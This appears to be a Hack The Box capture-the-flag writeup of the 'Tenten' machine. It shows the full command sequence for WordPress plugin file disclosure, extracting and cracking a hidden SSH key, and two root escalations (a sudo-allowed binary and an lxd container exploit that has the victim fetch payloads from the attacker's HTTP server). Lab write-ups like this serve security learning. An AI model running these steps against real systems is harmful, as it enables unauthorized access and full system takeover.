---
layout: post
title:  "Tenten Writeup - Hack The Box"
date:   2024-01-03
desc: "WordPress Enumeration, Job-Manager WordPress Plugin Abuse, Steganography Challenge, Cracking Hash, Sudoers Privilege Abuse"
keywords: "HTB,eJPT,eWPT,Linux,WordPress,Job-ManagerPlugin,Steganography,CrackingHash,Sudoers,Medium"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,WordPress,Job-ManagerPlugin,Steganography,CrackingHash,Sudoers,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

Another **Linux** machine from **[Hack The Box](https://www.hackthebox.com/){:target="_blank"}**, which has several themes, which some may appear in a job and some may not, but all together made me think a lot and also laterally. It served me to remember some things related to a **CMS** and some **CTF** that I could do in other platforms. The box is classified as **Medium** and I think it is because of the difficulty to access and not so much to the escalation of privileges. Here I go with my next Writeup of the **Tenten** machine.

<br/><br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 1000px;">
<br/><br/>

As usual and following the methodology that I am already incorporating more naturally, I deploy the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** and start the **Recognition** and **Enumeration** phase. With the `nmap` tool I get the open ports by **TCP** protocol, then if I don't find much I can try with other protocols such as **UDP**, **SCTP**. I find port **22** and **80** open, and if I use the basic `nmap` reconnaissance scripts, I discover the services and their versions, as well as the domain it is implementing. With the versions of the services I can search by the **Codename** of the machine on the Internet (**Xenial**), which matches for both, which would make me think that containers are not being deployed, but it is just a guess.

```bash
./htbExplorer -d Tenten
```

```bash
ping -c 1 10.10.10.10
whichSystem.py 10.10.10.10
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.10 -oG allPorts
nmap -sCV -p22,80 10.10.10.10 -oN targeted

cat targeted
# --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
# --> Apache httpd 2.4.18
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before I continue enumerating, I am going to add the domain to my file, so that there are no problems in name resolution to **IP**. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I find that the technologies employed by the web service are a **WordPress CMS** and the programming language is **PHP**. If I access the authentication panel, in the default path to access the **Dashboard** (a bad practice in the installation of a CMS), I see that you can list users, because if I enter one that does not exist and one that does (I found one when browsing the website - **takis**), the error messages are different.

```bash
nvim /etc/hosts
ping -c 1 tenten.htb

whatweb http://10.10.10.10
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

With `searchsploit` I can find an exploit to enumerate users of a **WordPress**, but if I analyze the script I find the path where it performs the search and if I access from the browser I find nothing. I can also look for other interesting files that they recommend me in **[HackTricks - Wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress){:target="_blank"}**, for the moment I do not find many possibilities. There is also a script to enumerate users via **SSH**, but I will not perform this brute force attack for now.

```bash
searchsploit wordpress user enumeration
searchsploit -x php/webapps/41497.php

searchsploit ssh user enumeration
searchsploit -m linux/local/46978.sh
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before doing any **Active Information Gathering**, I'm going to explore the website a bit. The site allows you to apply for a job and upload a **CV**, but in doing so I don't see any kind of information leakage, I should use `burpsuite`, but for now I'm going to employ lateral thinking to try to see how the site behaves. I note that there is only one job posting, but perhaps there are more.

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to list the posts related to applications to jobs using `curl`, I create a **one liner** to see the titles of each post and I find several interesting, but the name of number **13** is too striking **"HackerAccessGranted"**, which leaves me with a great feeling that I am on the right way, I am very aware of how **WordPress** stores all the resources of the posts, in folders, by year and then by months.

```bash
curl -s -X GET http://tenten.htb/index.php/jobs/apply/8/
curl -s -X GET http://tenten.htb/index.php/jobs/apply/8/ | html2text
curl -s -X GET http://tenten.htb/index.php/jobs/apply/8/ | html2text | grep Title:

for i in $(seq 1 100); do echo "[+] For number $i $(curl -s -X GET http://tenten.htb/index.php/jobs/apply/$i/ | html2text | grep Title:)"; done
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Something you can try with **WordPress**, knowing that it is outdated or not, is to look for **plugins** that are outdated and have some vulnerability. I can use a dictionary of **[SecLists](https://github.com/danielmiessler/SecLists){:target="_blank"}** by **Daniel Miessler**, but it doesn't cover all of them. So if I look for the repository on **Github** where the list is updated, I find the **[WordPress Plugins SVN Mirror](https://github.com/wp-plugins){:target="_blank"}** resource, so I'm going to use some commands to filter by plugin names and save them in a custom dictionary. Now I use `wfuzz`, not forgetting in which directory I should look for plugins and I manage to find a pair.

```bash
cat /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt | wc -l
# --> 13370

curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?page=1&type=all"
curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?page=1&type=all" | html2text
curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?page=1&type=all" | html2text | grep "\* \*\*\*\* "
curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?page=1&type=all" | html2text | grep "\* \*\*\*\* " | awk '{print $3}'

bash
for i in $(seq 1 1757); do curl -s -X GET "https://github.com/orgs/wp-plugins/repositories?page=$i&type=all" | html2text | grep "\* \*\*\*\* " | awk '{print $3}' >> plugins_dictionary.txt; done

wc -l plugins_dictionary.txt
# --> 52710

cat plugins_dictionary.txt | head -n 100

wfuzz -c --hc=404 -w plugins_dictionary.txt http://tenten.htb/wp-content/plugins/FUZZ
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search for some exploit with `searchsploit` I find nothing, but if I search with some search engine, it already suggests me with the autocomplete that there are resources, I find a very interesting article, **[WordPress Plugin Job Manager Security Bypass (0.7.25)](https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-job-manager-security-bypass-0-7-25/){:target="_blank"}** that describes me the vulnerability, it is possible to enumerate sensitive resources and access the uploaded CV files. In the article it refers to the **[CVE-2015-6668](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/){:target="_blank"}** research, but it is no longer available on the Internet. To solve this problem, there is the **[Wayback Machine](https://archive.org/web/){:target="_blank"}** tool where I can access a **Snapshot** of the website and thus find a **[POC](https://web.archive.org/web/20191022171628/https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/){:target="_blank"}** that might help me.

```bash
searchsploit job-manager
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I have a **PoC**, I will create a script but I will also correct the range of years that is contemplated there, to cover more time and not miss information from recent **posts**, since the exploit is quite old. When I run it it asks me for the name of the file, which seems to me to be related to the names of the posts I found earlier, I am going to use the **"HackerAccessGranted"**, but I don't succeed. I'm running the exploit with `python2`, I'm going to update it a bit and employ `python3`, but I'm still not leaking information. In the script it takes into account three types of file extensions, but if I add some more typical ones I can access a resource.

```bash
nvim job_manager_exploit.py
python job_manager_exploit.py
python2 job_manager_exploit.py

python3 job_manager_exploit.py
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I access the resource with the browser and it exists, I download it and confirm that it is an image with `file`, then I investigate the metadata with `exiftool`, but it has no relevant data. If I check with `steghide` for files that may be hidden in the image, there is an **id_rsa** key and I extract it, I am lucky because I don't need a password at the moment. I get the **key**, but it is encrypted, so I look for the `ssh2john` script to get its **hash** and then with `john`, I can get the password of the **id_rsa** key.

```bash
mv ~/Downloads/HackerAccessGranted.jpg .
file HackerAccessGranted.jpg
exiftool !$

steghide --help
steghide info HackerAccessGranted.jpg
steghide extract -sf HackerAccessGranted.jpg

locate ssh2john
/usr/bin/ssh2john id_rsa > hash
cat hash

john -w:$(locate rockyou.txt)
john -w:/usr/share/wordlists/rockyou.txt hash
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I can change the permissions needed by the **id_rsa key** and connect via **SSH** as the **takis** user. I start to enumerate the systems, interesting things I find: I am in the real machine and not in a container, the Codename is **Xenial**, I am in the **lxd** group (susceptible to an exploit to escalate privileges) and sudo, the `pkexec` binary has **SUID** permissions (the one I can exploit thanks to the exploit **[CVE-2022-0847-DirtyPipe-Exploit](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit){:target="_blank"}**), I already have access to the first flag. But the most interesting thing I find when I see the special privileges that the **takis** user has is that he can execute a `fuckin` binary as the `root` user, and by testing its execution with `sudo` I can spawn a shell as the user who owns the script and I can already rooted the box.

> **Attacker Machine**:

```bash
chmod 600 id_rsa
ssh -i id_rsa takis@10.10.10.10
```

> **Victime Machine**:

```bash
export TERM=xterm
whoami
hostname
hostname -I
uname -a
lsb_release -a
# --> xenial

id
groups

find \-perm -4000 2>/dev/null
which pkexec | xargs ls -l
# -rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec

sudo -l
# --> (ALL) NOPASSWD: /bin/fuckin

/bin/fuckin
/bin/fuckin whoami
sudo /bin/fuckin whoami
sudo /bin/fuckin bash
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I am going to use another vector to escalate privileges in this box, I can search with `searchploit` for an exploit for **lxd**, and I find the one from **S4vitar** and **vowkin** that automates the whole exploitation. I just need to download the script, follow the steps indicated there to download an image of **Alpine** and then create a container specially configured to mount the **root** directory of the vulnerable system in the **/mnt** directory of the container, and from there make all the necessary modifications to escalate privileges. I also know from the community that I should delete some commands from the script to avoid problems, transfer both the container and the exploit to the victim machine, and give the script execution permissions but I get an error message for an execution permission.

> **Attacker Machine**:

```bash
searchsploit lxd
searchsploit -m linux/local/46978.sh
mv 46978.sh lxd_exploit.sh

wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine

python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/alpine-v3.19-x86_64-20240102_1831.tar.gz
wget 10.10.14.15/lxd_exploit.sh
chmod +x lxd_exploit.sh
./lxd_exploit.sh
./lxd_exploit.sh alpine-v3.19-x86_64-20240102_1831.tar.gz
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I will fix the script and remove the command that is creating the permissions conflict, but I will also take the opportunity to convert the `lxd_exploit.sh` script to unix (something that **S4vitar** also recommends). I transfer again the modified script to the victim machine and I manage to run it successfully, I access from the container to the **/bin** directory and I grant **SUID** permissions to the `bash`, I exit the container and I can spawn a `bash` according to the owner's permissions (`root`) and again I manage to rooted the box.

> **Attacker Machine**:

```bash
dos2unix lxd_exploit.sh
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/lxd_exploit.sh
chmod +x lxd_exploit.sh

./lxd_exploit.sh alpine-v3.19-x86_64-20240102_1831.tar.gz

# Container
cd /mnt/
cd ./root
cd /bin

ls -l ./bash
chmod u+s bash

exit

# Host
ls -l /bin/bash

bash -p
```

<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/tenten_writeup/Tenten_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> I've heard enough times that you can take advantage of **Hack The Boxes**, in multiple ways to play, learn and test various ways to exploit vulnerabilities. You should take full advantage of each lab, it can even take several weeks to understand different concepts and even create scripts to automate attacks or exploit services. I kill the box with **htbExplorer** and I can choose the next lab!

```bash
./htbExplorer -k Tenten
```
